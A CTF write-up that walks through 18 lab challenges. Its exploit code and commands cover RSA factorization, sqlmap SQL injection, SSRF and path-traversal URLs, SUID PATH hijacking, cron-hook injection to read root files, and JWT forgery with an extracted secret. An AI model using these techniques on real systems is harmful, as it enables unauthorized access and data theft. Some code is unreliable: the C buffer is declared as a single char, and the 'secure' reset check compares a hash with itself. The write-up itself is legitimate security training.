---
title: "Synchrony Infosec University Hackathon – Round 2 Writeup"
date: 2026-01-18T00:00:00+00:00
category: CTF
tags: ["ctf", "infosec", "crypto", "web", "re", "exp", "df", "net", "mob"]
description: "Detailed writeup for Synchrony Infosec University Hackathon Round 2 – 20 challenges across crypto, web, RE, exp, DF, net, and mobile."
toc: true
comments: true
---

## Overview

The **Synchrony Infosec University Hackathon Round 2** was a comprehensive CTF featuring 20 challenges across multiple categories. This writeup covers my step‑by‑step approaches for **18 solved challenges**, including scripts, tools, and key recoveries.


## Crypto 01 – Intercepted Comms

**Flag:** `TDHCTF{intercepted_comms_decrypted}`  
**Key:** `fc1c1888359c314efbaa28488b317362bcfa2032abe9313507eb8d5edd7ac77c`

### Approach

1. Download the challenge file and decode it using ROT13 to reveal the key and encrypted payload. 
2. Implement AES decryption in Python with the provided key and zero IV:

    ```python
    from Crypto.Cipher import AES
    import base64

    key = b'HEISTFgjXbeZzNk6'
    iv = b'\x00' * 16
    payload = 'FfOndwa5NfboqsMurhCihjGm3h8y8czi4rxdE8DsmmVKQeUjBj3dP1uyWL+Jj/7FEQ1NI9QcJoFJfTczfqGi3gzy8ZR8NpxSxMsd/Sp/3jX5+tHztyGf8yudoqxk1119KbfDnX4LemkmqbHwPiZJZmuumkWhvQ2PdlRPGwJ7lPEu+I6/FQd9j0VAmhzpVZPW'

    ciphertext = base64.b64decode(payload)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)

    # Remove PKCS#7 padding
    pad_len = plaintext[-1]
    decrypted = plaintext[:-pad_len]
    print(decrypted.decode())
    ```
3. The script outputs Base64‑encoded key and flag, which decode to the final values.


## Crypto 02 – Vault Breach

**Flag:** `TDHCTF{vault_breach_decrypted}`  
**Key:** `9ad885aaff8628fd3e79e2279ea0fd9cf26c9ca62673064a716282724dbb403f`

### Approach

1. The RSA public key uses two **close primes** (p ≈ q), making it vulnerable to **Fermat's factorization method**. 
2. Implement Fermat factorization to recover p and q, then decrypt the ciphertext:
    ```python
    from Crypto.Util.number import inverse, long_to_bytes
    import math

    n = 176660542456629263769672737336744698569162819100887991835595399608081629344633991447915967310913698492335756202153736596065395110131157883376706217626917974125877737538055138769991600320614501678896476346038316151600152832584184899416161506675406470573876435287520290693482643844633053153562657055855881697093
    e = 65537
    c = 17807332646088521377365116993135135787188031178117797826179857888666062445207674204347771715788832965350659135611410271268289598685579896982859791397374286890689152804250238284027168977098249373280374436748874833928368457216566753121302368956034207816672069880073147147201458660711346190579613350251253203992

    # Fermat factorization
    a = math.isqrt(n) + 1
    while True:
        b2 = a*a - n
        b = math.isqrt(b2)
        if b*b == b2: break
        a += 1

    p, q = a-b, a+b
    phi = (p-1)*(q-1)
    d = inverse(e, phi)
    m = pow(c, d, n)
    print(long_to_bytes(m).decode())
    ```
3. The script recovers p/q, computes the private key d, and decrypts the ciphertext to reveal the key and flag.


## Crypto 03 – Quantum Safe

**Flag:** `TDHCTF{quantum_safe_decrypted}`  
**Key:** `1fd370d2dc3f9804d176f1cf8c578f825b1be46a60a39fe627b313c1c7ca3a4f`

### Approach

1. Download `1337crypt_output.txt` containing RSA modulus `n`, public exponent `e`, and ciphertext `c`. The RSA primes are close together, making factorization computationally feasible. 
2. Use **RsaCtfTool** for automated attack detection and Fermat factorization:
    ```bash
    python3 RsaCtfTool.py -n <N> -e <E> --uncipher <C>
    ```
3. The tool automatically:
   - Detects the close primes vulnerability
   - Applies Fermat factorization to recover primes p and q
   - Computes the private exponent d
   - Decrypts the ciphertext and outputs the plaintext
4. Extract the structured results from the decrypted output.


## Web 01 – Royalmint

**Flag:** `TDHCTF{DENVER_LAUGHS_AT_BROKEN_ACL}`  
**Key:** `05c3857d677982b5a711a619b297d86b2aeafd17185608ebdadeeea00bea3312`

### Approach

1. Access the target URL and submit arbitrary credentials in the login form to observe the application's behavior.
2. Intercept the login request using **Burp Suite** and save it as `login.req` for automated testing.
3. Execute **sqlmap** with elevated detection and exploitation options:

    ```bash
    sqlmap -r login.req --batch --level=5 --risk=3 -p username --ignore-code=401 --dump
    ```
4. Sqlmap identifies **SQL injection** in the `username` parameter, bypasses authentication (ignoring 401 responses), and dumps the database contents.
5. The output reveals the key and flag embedded in the database.


## Web 02 – Ticket To The Vault

**Flag:** `TDHCTF{THE_BOT_DID_THE_DIRTY_WORK}`  
**Key:** `940e57ebfa5c977369391c158c55f8eb707528e863afe0471ba4a2dc33c38041`

### Approach

1. Navigate to the application at `http://10.60.0.39:5002/`.
2. Check `http://10.60.0.39:5002/robots.txt`, which exposes **admin credentials**: `admin:admin123`.
3. Log in successfully using `admin` / `admin123`.
4. Perform **directory brute-forcing** using tools like `gobuster` or `ffuf` to discover the hidden endpoint `/admin/flag`.
5. Access `http://10.60.0.39:5002/admin/flag` to retrieve the key and flag.


## Web 03 – Safehouse

### Approach

1. Open the challenge web application.
2. **Login** with credentials:  
   `tokyo` / `tokyo123`
3. Navigate to **Settings/Command page** and copy the **"Professor's Access Token"**.
4. Go to the **URL preview page**: `/preview`
5. Exploit **SSRF** using the `@` trick to bypass hostname validation and reach the internal server:
   ```http://previewme.com@internal-admin:8080/flag?token=YOUR_TOKEN_HERE```
6. The preview response displays the flag from the internal `/flag` endpoint.


## RE 01 – Confession App

**Flag:** `TDHCTF{confession_gateway_phrase}`  
**Key:** `9a22a17c023d285c21c4fdb3ddd8ea58d817c659feb7be3cfd0f08f167b086af`

### Approach

1. **Quick check with strings:**
    ```bash
    strings confession_app | less
    ```
   If no obvious passphrase found, proceed to static analysis.
2. Open `confession_app` in **Ghidra** and locate the input validation function.
3. Identify the encoded data reference (address + length) used in the comparison logic.
4. **Extract bytes** from Ghidra:
   - Press `G` and navigate to the data address
   - Select the exact number of bytes referenced
   - Copy as hex/byte string
5. **Decode the XOR cipher** on the extracted bytes to reveal:
    ```su ot delaever won si noitacol yawetag krowten eTh```
6. **Reverse the string** (program reverses input before comparison):
    ```The network gateway location is now revealed to us```
7. Run the program and submit the passphrase to validate and retrieve the flag.


## RE 02 – Evidence Tampering

**Flag:** `TDHCTF{tampered_time_offset}`  
**Key:** `958a6cf53bc406201b52149a6bf921e86852a37079bde5bc07d72bf869117ee6`

### Approach

1. Open the `evidence` binary in **Ghidra** and analyze with default options.
2. **Search for success string:**
   - `Search → For Strings`
   - Find: `Timeline rewrite validated.`
   - Press `X` (references) to trace usage in code.
3. Locate input validation in decompiler - input read via `strtoull()` and XOR-checked:
   ```(uVar10 ^ 0x5a5a5a5a5a5a5a5a) - 0x1111110a == target```
4. **Find target value:**
- Program decrypts 10 bytes from data section
- Decrypted bytes don't start with digits → `strtoull()` returns `0`
- **Target = 0**
5. **Solve the equation:**
    ```
    uVar10 ^ 0x5a5a5a5a5a5a5a5a = 0x1111110a
    uVar10 = 0x1111110a ^ 0x5a5a5a5a5a5a5a5a
    = 0x5a5a5a5a4b4b4b50
    ```
    **Decimal:** `6510615555174255440`
6. Run the program and enter `6510615555174255440` to validate timeline rewrite and get flag.


## SC 01 – Logview

**Flag:** `TDHCTF{BELLA_CIAO_NO_MORE_DOT_DOT_SLASH}`  
**Key:** `15e667cea82b6bffd2f63414e8d3fbb1d937ad32009058da8f6d77e608f187c5`

### Approach

1. Access the target URL and check `robots.txt` for hidden paths.
2. Discover `/source` endpoint exposing file listing in JSON format.
3. Retrieve `/source/server.js` revealing backend source code, flag, and key path `../secrets/vault.key`.
4. Return to root directory (`/`) and test download functionality:
    ```http://10.60.0.39:5101/download?file=heist.log```
5. **Exploit path traversal LFI** by modifying the `file` parameter:
    ```http://10.60.0.39:5101/download?file=../secrets/vault.key```
6. Download the vault key file to recover the credentials.

## SC 02 – Reset Pass

**Flag:** `TDHCTF{ONE_TIME_TOKEN_ONE_TIME_HEIST}`  
**Key:** `f804574976113e2d34ec55560e99eb2b2d1731f732982e84192bdebe085e60ba`

### Approach

1. Access the target URL and navigate to `/editor` endpoint for source code modification.
2. Replace `src/security/reset.js` with a **secure implementation** addressing all vulnerabilities:
   - `crypto.randomBytes()` for cryptographically strong tokens
   - SHA256 hashing of tokens (store only hashes)
   - `timingSafeEqual()` for constant-time comparison
   - 15-minute expiry with `Map` storage
   - One-time use (delete after validation)
   - Non-enumerating responses

    ```javascript
    const crypto = require("crypto");
    const { getUserByEmail } = require("../storage/users");

    const RESET_STORE = new Map();
    const RESET_MESSAGE = "If the account exists, reset instructions have been issued.";
    const EXPIRY_MS = 15 * 60 * 1000; // 15 minutes

    function sha256Buf(v) {
      return crypto.createHash("sha256").update(v).digest();
    }

    async function forgotPassword(email) {
      const token = crypto.randomBytes(32).toString("hex");
      const tokenHashHex = sha256Buf(token).toString("hex");
      const user = getUserByEmail(email);
      
      if (user) {
        RESET_STORE.set(tokenHashHex, {
          email: user.email,
          expiresAt: Date.now() + EXPIRY_MS,
        });
      }
      
      return { message: RESET_MESSAGE, token };
    }

    async function resetPassword(token, newPassword) {
      if (typeof token !== "string" || token.length !== 64) {
        return { ok: false, error: "Invalid token" };
      }
      
      const providedHashBuf = sha256Buf(token);
      const providedHashHex = providedHashBuf.toString("hex");
      const rec = RESET_STORE.get(providedHashHex);
      
      if (!rec || Date.now() > rec.expiresAt || 
          !crypto.timingSafeEqual(Buffer.from(providedHashHex, "hex"), providedHashBuf) ||
          typeof newPassword !== "string" || newPassword.length < 6) {
        RESET_STORE.delete(providedHashHex);
        return { ok: false, error: "Invalid token" };
      }
      
      RESET_STORE.delete(providedHashHex);
      return { ok: true, email: rec.email };
    }

    module.exports = { forgotPassword, resetPassword, RESET_STORE };
    ```
3. Verify the replacement satisfies all security requirements.
4. Retrieve key from `/mint/key` endpoint and submit via `/mint/flag/?key=<key_value>` to get flag.


## Exp 01 – Berlin's Locker

**Flag:** `TDHCTF{berlins_locker_compromised}`  
**Key:** `9ed0cc6bbc81c00fa71b4c3b231aed7cf8ca5e8a0207a3427f2c457d70383391`

### Approach

1. Access target machine via SSH using provided credentials.
2. Analyze `/entrypoint.sh` revealing **SUID binary** `/usr/local/bin/lockerctl` executes `backup` from **PATH** during `rotate` operation.
3. Create **privilege escalation exploit** `backup.c` to copy restricted files:

    ```c
    #include <fcntl.h>
    #include <unistd.h>
    #include <sys/stat.h>

    static void copy(const char *src, const char *dst) {
        int in = open(src, O_RDONLY);
        int out = open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0600);
        char buf;
        ssize_t n;
        while ((n = read(in, buf, sizeof(buf))) > 0)
            write(out, buf, n);
        close(in); close(out);
    }

    int main() {
        copy("/opt/mint/key.txt",  "/home/tokyo/key.txt");
        copy("/root/flag.txt",    "/home/tokyo/flag.txt");
        chown("/home/tokyo/key.txt", 1000, 1000);
        chown("/home/tokyo/flag.txt", 1000, 1000);
        chmod("/home/tokyo/key.txt", 0600);
        chmod("/home/tokyo/flag.txt",0600);
        return 0;
    }
    ```
4. **Compile and deploy:**
    ```bash
    gcc -O2 -s -o ~/bin/backup ~/bin/backup.c && chmod +x ~/bin/backup
    ```
5. **Trigger SUID via PATH hijacking:**
    ```bash
    export PATH="$HOME/bin:$PATH"
    /usr/local/bin/lockerctl rotate /opt/lockers/logs/heist.log
    ```
6. Key and flag now accessible in `/home/tokyo/`.


## Exp 02 – Rio's Radio

**Flag:** `TDHCTF{PIVOTED_THEN_ROOTED_BY_CRON}`  
**Key:** `9943df2d54dd3a33fb310761795002ded8cbf50d1ec93cdcc1657d7d996eb64c`

### Approach

1. **Initial Access:** SSH as `tokyo` user:
    ```bash
    ssh tokyo@localhost -p 2222
    # Password: tokyo123
    ```
2. **Enumerate users and files:**
    ```bash
    cat /etc/passwd | grep -E "(tokyo|rio|root)"
    ls -la /opt/ /var/log/
    ```
3. **Stage 1 - Pivot to rio:** Find exposed credentials in world-readable config:
    ```bash
    cat /opt/relay/relay.env
    # Reveals: RIO_USER=rio RIO_PASS=rio123
    su rio
    # Password: rio123
    cat /home/rio/mint.key  # KEY obtained
    ```
4. **Stage 2 - Root via Cron:** Analyze cron job and writable config:
    ```bash
    cat /etc/cron.d/mint-rotation  # Runs /opt/rotation/rotate.sh as root every minute
    ls -la /opt/rotation/rotation.env  # Writable by rio group
    cat /opt/rotation/rotate.sh  # Sources rotation.env and executes POST_ROTATE_HOOK
    ```
5. **Inject root command execution:**
    ```bash
    echo 'POST_ROTATE_HOOK="cat /root/flag.txt > /tmp/root_flag && chmod 666 /tmp/root_flag"' >> /opt/rotation/rotation.env
    ```
6. **Wait for cron execution (~1 minute) and retrieve flag:**
    ```bash
    sleep 65
    cat /tmp/root_flag 
    ```

## DF 01 – Night Walk Photo

**Flag:** `TDHCTF{exif_shadow_unit}`  
**Key:** `b01a5e22dbbc55a04cc79ff62e09c16ea05fdad3515751d5e1ae9b96804126e8`

### Approach

1. Download `night-walk.jpg` and analyze **EXIF metadata**:
    ```bash
    exiftool -s -Comment night-walk.jpg
    ```
2. Identify **Base64-encoded blob** in Comment field delimited by:
    ```
    --BEGIN-BLOB-B64--
    --END-BLOB-B64--
    ```
3. **Extract and clean Base64 data**:
 ```bash
 exiftool -s -Comment night-walk.jpg | sed -n 's/.*--BEGIN-BLOB-B64--//; s/--END-BLOB-B64--.*//; p' | tr -d '.\n' > blob.b64
 ```
4. **Decode and decompress**:
 ```bash
 base64 -d blob.b64 > blob.gz
 gunzip blob.gz
 ```
5. Recovered plaintext file reveals the key and flag.


## DF 02 – Burned USB

**Flag:** `TDHCTF{carved_network_node}`  
**Key:** `9707cc2fcb60b1fd802e4ba08c5d29905ee9d088771b76b3465f98d301c8556e`

### Approach

1. **Carve gzip stream** from disk image using file header offset:
    ```bash
    dd if=burned-usb.img bs=1 skip=6197 of=core_corrupted.gz
    file core_corrupted.gz  # gzip, max compression, ~406 bytes original
    ```
2. **Identify scrub markers** in corrupted gzip:
    ```bash
    strings -td core_corrupted.gz | grep DIRECTORATE
    # Shows: <<DIRECTORATE_SCRUB_GAP>> and </DIRECTORATE_SCRUB_GAP>>
    ```
3. **Clean scrubbed sections** with Python script:
    ```python
    import sys
    
    data = open("core_corrupted.gz", "rb").read()
    start = b"<<DIRECTORATE_SCRUB_GAP>>"
    end   = b"</DIRECTORATE_SCRUB_GAP>>"
    
    out = bytearray()
    i = 0
    while i < len(data):
        s = data.find(start, i)
        if s == -1:
            out.extend(data[i:])
            break
        out.extend(data[i:s])
        e = data.find(end, s + len(start))
        if e == -1:
            break
        i = e + len(end)
    
    open("core_clean.gz", "wb").write(out)
    print("Written core_clean.gz")
    ```
4. **Decompress and extract content**:
    ```bash
    file core_clean.gz  # Valid gzip
    gunzip -c core_clean.gz > core_document.bin
    strings core_document.bin | sed -n '1,200p'  # Reveals network blueprint
    ```

## Net 01 – Onion Pcap

**Flag:** `TDHCTF{rogue_engineer_signal}`  
**Key:** `ccef6dbf9ab5d170e21b9ee17e084c669b55ef89adfa4aa1efcafbca9061c4ca`

### Approach

1. Download `net-01-onion-pcap.pcap` and perform initial analysis to identify data exfiltration patterns.
2. **Discover DNS tunneling** via Base64-encoded subdomains:
    ```bash
    tshark -r net-01-onion-pcap.pcap -Y 'dns && dns.qry.name contains "blueprint.professor.royalmint.local"' -T fields -e frame.time_epoch -e dns.qry.name | sort -n > dns_blueprint.txt
    ```
3. **Extract Base64 payloads** from time-ordered DNS queries in `dns_blueprint.txt`, keeping only subdomain portions (before `.blueprint.professor.royalmint.local`).
4. **Concatenate and decode** the reassembled Base64 string to reveal plaintext key and flag.
   
## Net 02 – DoH Rhythm

**Flag:** `TDHCTF{dns_tunnel_key}`  
**Key:** `815fd0f8b1c068d29c74c158c9b561f8af9413039b9820e03408369fae73a2ab`

### Approach

1. Download `net-02-doh-rhythm.pcap` and extract exfiltration data:
    ```bash
    tshark -r net-02-doh-rhythm.pcap -Y 'http.request and http.user_agent contains "ExfilChunk"' -T fields -e frame.time_epoch -e http.request.uri -e http.user_agent > exfil_ua.raw
    ```
2. Inspect `exfil_ua.raw` revealing **time-ordered Base64 chunks** embedded in User-Agent headers.
3. **Reassemble chunks** by sorting on `frame.time_epoch` timestamps and concatenate Base64 payloads from User-Agent strings.
4. **Decode the complete Base64 string** to recover plaintext key and flag.


## Mob 01 

**Flag:** `TDHCTF{mob01_insecure_notes_pin_bypass}`  
**Key:** `bc00748d62ca37e391f85518679a0916af87768792e79c386c11f38bf68b2e28`

### Approach

1. **Install and analyze APK** on emulator/device, trigger lock screen asking for access phrase.
2. **Decompile with jadx** to static analyze the app.
3. **Search for access logic** using strings:
    ```
    AccessPhraseGate
    MINT-ACCESS
    ```
4. **Locate phrase fragments** scattered across:
- `AndroidManifest.xml` (meta-data)
- `res/values/strings.xml`
- `assets/config.txt`
5. **Reconstruct full access phrase:**
    ```MINT-ACCESS-7429-PROFESSOR```
6. **Unlock the note** by entering the reconstructed phrase.
7. **Retrieve embedded KEY and FLAG** displayed by the app.

## Mob 02 

**Flag:** `TDHCTF{offline_reset_token_forgery}`  
**Key:** `b95802fca804ced0d44ad8d9c5f0d9b2382b1b9abcaed7bb57538a14da681c95`

### Approach

1. **Generate sample JWT** in app using "Generate reset token" for any email to understand token format.
2. **Decompile APK with jadx** and search for JWT-related keywords:
   ```HmacSHA256, HS256, jwtSecret, SecretProvider```
3. **Extract JWT signing secret** from `SecretProvider` class:
    ```TDH_MOB03_RESET_TOKEN_SIGNING_KEY_2025```
4. **Forge admin JWT** (HS256) with Python:
    ```python
    import base64, hmac, hashlib, json, time

    def b64url(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).decode().rstrip("=")

    secret = b"TDH_MOB03_RESET_TOKEN_SIGNING_KEY_2025"
    header = {"alg": "HS256", "typ": "JWT"}
    now = int(time.time())
    payload = {
        "email": "test@ctf.local",
        "role": "admin",
        "iat": now,
        "exp": now + 3600,
    }

    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    token = f"{header_b64}.{payload_b64}.{b64url(sig)}"
    print(token)
    ```
5. **Submit forged admin token** to app's "Submit token" section and tap Reset.
6. App validates locally and displays **KEY** and **FLAG**.
